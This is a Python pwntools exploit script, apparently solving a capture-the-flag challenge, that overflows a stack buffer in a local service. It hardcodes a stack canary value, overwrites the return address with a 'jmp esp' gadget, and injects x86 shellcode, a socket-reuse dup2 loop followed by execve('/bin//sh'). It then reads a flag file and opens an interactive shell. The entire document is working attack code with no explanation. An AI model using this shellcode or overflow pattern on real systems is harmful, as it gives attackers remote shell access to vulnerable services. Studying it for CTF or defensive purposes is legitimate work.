from pwn import remote
from struct import *
host = '127.0.0.1'
port = '53000'
r = remote(host, port)
r.recvuntil('binary')
r.send("P")
r.recvuntil('protected!')

binsh = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
binsh += "\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

socketReuse = "\x31\xc9\x31\xdb\x8b\x9c\x24\x40\xff\xff\xff\x6a\x3f\x58\xcd\x80\x41\x80\xf9\x03\x75\xf5"

payload = "\x90" * 104              #stack
payload += pack("<L", 0x01C0ff33)   #canary
payload += "A"*4                    #arbitrary EBP clobber
payload += pack("<L", 0x56556218)   #jump esp
payload += socketReuse
payload += binsh
payload += "\x90"*37 #pad to 200 bytes

r.send(payload)
r.send("cat /opt/cookie/flag")
r.interactive()
